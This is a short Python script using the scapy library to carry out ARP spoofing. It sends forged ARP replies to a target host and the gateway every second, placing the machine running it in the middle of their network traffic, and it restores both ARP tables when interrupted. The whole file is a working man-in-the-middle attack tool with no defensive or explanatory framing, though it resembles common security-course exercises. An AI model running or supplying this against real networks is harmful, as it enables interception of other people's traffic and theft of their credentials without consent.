#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse


def get_range():
    parser = argparse.ArgumentParser()

    parser.add_argument("-t", "--target", dest="target", help="use this to set the target ip")
    parser.add_argument("-r", "--spoof", dest="gateway", help="use this to set the gateway ip")
    options = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify the target's IP, use --help for more info")
    elif not options.gateway:
        parser.error("[-] Please specify the gateway IP, use --help for more info")

    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, psrc=src_ip, hwdst=dst_mac, hwsrc=src_mac)
    scapy.send(packet, count=10, verbose=False)


args = get_range()

try:
    packet_count = 0

    while True:
        print("\r[+] Packets sent: " + str(packet_count)),
        spoof(args.target, args.gateway)
        spoof(args.gateway, args.target)
        packet_count += 2
        sys.stdout.flush()
        time.sleep(1)

except KeyboardInterrupt:
    print("\n\n[+] Detected CTRL + C...... \nResetting ARP tables. Please wait.....")
    restore(args.gateway, args.target)
    restore(args.target, args.gateway)
